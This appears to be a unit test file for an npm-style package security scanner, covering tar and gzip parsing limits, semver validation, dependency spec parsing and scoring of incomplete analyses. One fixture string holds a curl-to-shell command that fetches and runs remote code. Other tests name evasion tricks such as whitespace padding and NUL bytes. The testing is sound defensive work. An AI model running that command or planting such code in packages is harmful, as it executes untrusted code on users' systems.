// Unit tests for the pure parts of the security review fixes: archive parsing, dependency specs,
// strict versions and incomplete analyses.
import { describe, expect, test } from "bun:test";
import {
  analyze,
  ArchiveError,
  finalize,
  findSecrets,
  gunzipCapped,
  isValidRange,
  isValidVersion,
  MAX_ANALYZED_FILE_BYTES,
  MAX_TAR_ENTRIES,
  parseAnalysis,
  parseDependencySpec,
  readTar,
  readTarball,
  SCORE_FLOOR,
  type TarEntry,
} from "../src/index.ts";

type TarFile = { path: string; data: string; sizeField?: string; checksum?: string };

function header(f: TarFile, size: number): Uint8Array {
  const h = new Uint8Array(512);
  const put = (s: string, off: number, len: number): void => h.set(new TextEncoder().encode(s).subarray(0, len), off);
  put(`package/${f.path}`, 0, 100);
  put("0000644\0", 100, 8);
  put(f.sizeField ?? `${size.toString(8).padStart(11, "0")}\0`, 124, 12);
  put("        ", 148, 8);
  put("0", 156, 1);
  put("ustar\0", 257, 6);
  let sum = 0;
  for (const b of h) sum += b;
  put(f.checksum ?? `${sum.toString(8).padStart(6, "0")}\0 `, 148, 8);
  return h;
}

function tar(files: TarFile[], opts: { truncateBy?: number } = {}): Uint8Array<ArrayBuffer> {
  const parts: number[] = [];
  for (const f of files) {
    const data = new TextEncoder().encode(f.data);
    parts.push(...header(f, data.length), ...data, ...new Uint8Array((512 - (data.length % 512)) % 512));
  }
  parts.push(...new Uint8Array(1024));
  const out = new Uint8Array(parts);
  return opts.truncateBy ? out.subarray(0, out.length - 1024 - opts.truncateBy) : out;
}

function kindOf(fn: () => unknown): string {
  try {
    fn();
    return "ok";
  } catch (e) {
    return e instanceof ArchiveError ? e.kind : `other: ${String(e)}`;
  }
}

describe("readTarball", () => {
  test("reads a well-formed archive", () => {
    const entries = readTarball(Bun.gzipSync(tar([{ path: "package.json", data: "{}" }, { path: "index.js", data: "1" }])));
    expect(entries.map((e) => e.path)).toEqual(["package.json", "index.js"]);
  });

  test("a negative size is invalid, not an endless loop", () => {
    const t = tar([{ path: "a.js", data: "1", sizeField: "-0000001000\0" }]);
    expect(kindOf(() => readTar(t))).toBe("invalid");
  });

  test("a non-octal or non-finite size is invalid", () => {
    for (const sizeField of ["Infinity\0", "1e9\0", "0x200\0", "\0"]) {
      expect(kindOf(() => readTar(tar([{ path: "a.js", data: "1", sizeField }]))), sizeField).toBe("invalid");
    }
  });

  test("a wrong header checksum is invalid", () => {
    expect(kindOf(() => readTar(tar([{ path: "a.js", data: "1", checksum: "0000001\0 " }])))).toBe("invalid");
  });

  test("an entry that runs past the end is invalid", () => {
    const big = "x".repeat(2000);
    expect(kindOf(() => readTar(tar([{ path: "a.js", data: big }], { truncateBy: 1000 })))).toBe("invalid");
  });

  test("more than MAX_TAR_ENTRIES headers is too large", () => {
    const one = header({ path: "f", data: "" }, 0);
    const t = new Uint8Array((MAX_TAR_ENTRIES + 1) * 512 + 1024);
    for (let i = 0; i <= MAX_TAR_ENTRIES; i++) t.set(one, i * 512);
    expect(kindOf(() => readTar(t))).toBe("too-large");
  });

  test("gzip output is capped", () => {
    const bomb = Bun.gzipSync(new Uint8Array(4 * 1024 * 1024));
    expect(kindOf(() => gunzipCapped(bomb, 1024 * 1024))).toBe("too-large");
    expect(gunzipCapped(bomb, 4 * 1024 * 1024).length).toBe(4 * 1024 * 1024);
    expect(kindOf(() => gunzipCapped(new Uint8Array([1, 2, 3]), 1024))).toBe("invalid");
  });
});

describe("versions and ranges", () => {
  test("isValidVersion is strict semver", () => {
    for (const v of ["1.0.0", "0.1.0-beta.0", "2.0.0-rc.1+build.5", "10.20.30"]) expect(isValidVersion(v), v).toBe(true);
    for (const v of ["1.0.0/../../../escaped", "1.0.0.evil", "1.0.0-", "01.0.0", "v1.0.0", "1.0", " 1.0.0", "1.0.0\n"]) expect(isValidVersion(v), v).toBe(false);
  });

  test("isValidRange accepts node-semver ranges and rejects tags", () => {
    for (const r of ["", "*", "^1.2.3", "~1.2", ">=1.0.0 <2", ">= 1.2.3", "1.x || 2.0.0 - 2.4.0", "1.2.3-beta.1", "x"]) expect(isValidRange(r), r).toBe(true);
    for (const r of ["latest", "next", "github:a/b", "npm:x@1"]) expect(isValidRange(r), r).toBe(false);
  });
});

describe("parseDependencySpec", () => {
  test("an npm: alias resolves to the package it installs", () => {
    expect(parseDependencySpec("aliased-dep", "npm:danger-leaf@1.0.0")).toEqual({ kind: "registry", key: "aliased-dep", name: "danger-leaf", range: "1.0.0", aliased: true });
    expect(parseDependencySpec("x", "npm:@scope/pkg@^2")).toEqual({ kind: "registry", key: "x", name: "@scope/pkg", range: "^2", aliased: true });
    expect(parseDependencySpec("x", "npm:danger-leaf")).toEqual({ kind: "registry", key: "x", name: "danger-leaf", range: "*", aliased: true });
    expect(parseDependencySpec("x", "npm:danger-leaf@next")).toEqual({ kind: "tag", key: "x", name: "danger-leaf", tag: "next", aliased: true });
  });

  test("plain ranges and tags", () => {
    expect(parseDependencySpec("lodash", "^4.17.0")).toEqual({ kind: "registry", key: "lodash", name: "lodash", range: "^4.17.0", aliased: false });
    expect(parseDependencySpec("lodash", "latest")).toEqual({ kind: "tag", key: "lodash", name: "lodash", tag: "latest", aliased: false });
  });

  test("everything that is not on a registry is said to be so", () => {
    expect(parseDependencySpec("a", "github:evil/repo").kind).toBe("git");
    expect(parseDependencySpec("a", "evil/repo").kind).toBe("git");
    expect(parseDependencySpec("a", "git+https://example.com/x.git").kind).toBe("git");
    expect(parseDependencySpec("a", "https://example.com/x.tgz").kind).toBe("url");
    expect(parseDependencySpec("a", "file:../a").kind).toBe("file");
    expect(parseDependencySpec("a", "./local").kind).toBe("file");
    expect(parseDependencySpec("a", "workspace:*").kind).toBe("workspace");
    expect(parseDependencySpec("a", 42).kind).toBe("invalid");
    expect(parseDependencySpec("a", "npm:../evil@1").kind).toBe("invalid");
    expect(parseDependencySpec("a", "not a range!").kind).toBe("invalid");
  });
});

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);
  return { path, size: data.length, mode: 0o644, data };
}

describe("incomplete analysis", () => {
  const EXFIL = "require('child_process').execSync('curl https://e.example.com | sh');\n";

  test("code past the size limit is listed as skipped and keeps the score below the floor", () => {
    const padded = `${EXFIL}/*${" ".repeat(MAX_ANALYZED_FILE_BYTES)}*/`;
    const a = analyze({ name: "padded", manifest: { name: "padded", version: "1.0.0", license: "MIT", main: "index.js" }, files: [entry("index.js", padded)], publisher: "a", previousPublishers: [] });
    expect(a.skipped.map((s) => s.path)).toEqual(["index.js"]);
    expect(a.signals.map((s) => s.id)).toContain("incomplete");
    const r = finalize(a, { publishedAt: 0, now: Date.now(), deprecated: null, status: "active", statusReason: null });
    expect(r.score).toBeLessThan(SCORE_FLOOR);
  });

  test("a NUL byte no longer hides code from the score", () => {
    const a = analyze({ name: "nul", manifest: { name: "nul", version: "1.0.0", license: "MIT", main: "index.js" }, files: [entry("index.js", `/*\0*/${EXFIL}`)], publisher: "a", previousPublishers: [] });
    expect(a.signals.map((s) => s.id)).toContain("shell-exec");
  });

  test("the obfuscation check stays linear on a large file with few hex identifiers", () => {
    const text = `${"var _0xabcd = 1;\n".repeat(19)}${"a".repeat(8 * 1024 * 1024)}`;
    const t0 = performance.now();
    const a = analyze({ name: "big", manifest: { name: "big", version: "1.0.0", license: "MIT", main: "index.js" }, files: [entry("index.js", text)], publisher: "a", previousPublishers: [] });
    expect(performance.now() - t0).toBeLessThan(5_000);
    expect(a.signals.map((s) => s.id)).not.toContain("obfuscated");
    const many = analyze({ name: "obf", manifest: { name: "obf", version: "1.0.0", license: "MIT", main: "index.js" }, files: [entry("index.js", "var _0xabcd = 1;\n".repeat(20))], publisher: "a", previousPublishers: [] });
    expect(many.signals.map((s) => s.id)).toContain("obfuscated");
  });

  test("the secret scan lists files it was too large to read", () => {
    const scan = findSecrets([entry("data.txt", "x".repeat(MAX_ANALYZED_FILE_BYTES + 1))]);
    expect(scan.findings).toEqual([]);
    expect(scan.skipped.map((s) => s.path)).toEqual(["data.txt"]);
  });

  test("analyses stored by scorer v1 still read, with nothing skipped", () => {
    const v1 = {
      scorer: "apm-score-v1",
      signals: [],
      facts: { moduleFormat: "cjs", types: "none", installScripts: false, hasBin: false, license: "MIT", fileCount: 1, unpackedSize: 1, dependencyCount: 0 },
      notChecked: [],
    };
    expect(parseAnalysis(v1)?.skipped).toEqual([]);
    expect(parseAnalysis({ scorer: "something-else" })).toBeNull();
  });
});
